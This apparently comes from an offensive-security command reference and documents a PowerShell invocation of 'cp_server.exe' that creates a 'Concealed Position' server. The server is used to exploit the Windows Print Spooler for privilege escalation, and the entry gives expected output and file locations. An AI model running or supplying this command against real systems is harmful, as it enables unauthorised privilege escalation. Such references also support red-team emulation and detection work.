---
id: 1d6110b2-a223-4ae9-abdd-34ccbc786ea6
name: cp-server-create-with-name
type: command
executor: powershell
data: cp_server.exe -e ACIDDAMAGE
output: null
created_at: '2023-04-06T03:56:29.907477+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - privilege-escalation
  - spooler
verified: true
validated: true
---

# cp-server-create-with-name

## Command

```powershell
cp_server.exe -e ACIDDAMAGE
```

## Description

Creates a Concealed Position server instance named 'ACIDDAMAGE' for Print Spooler exploitation, installing components that enable elevated execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -e | Specifies the execution name for the server (e.g., ACIDDAMAGE) | Yes |

## Examples

### Basic Usage

```powershell
cp_server.exe -e ACIDDAMAGE
```

### Advanced Usage

Use a different name: `cp_server.exe -e CustomName`

## Expected Output

Output confirming server creation, such as "Server installed successfully" or file paths to installed components in the spooler directory. No errors indicate success; check %SystemRoot%\System32\spool for new files.

## Related

- [[procedures/Printer-Spooler-Service-Elevation-of-Privilege]]
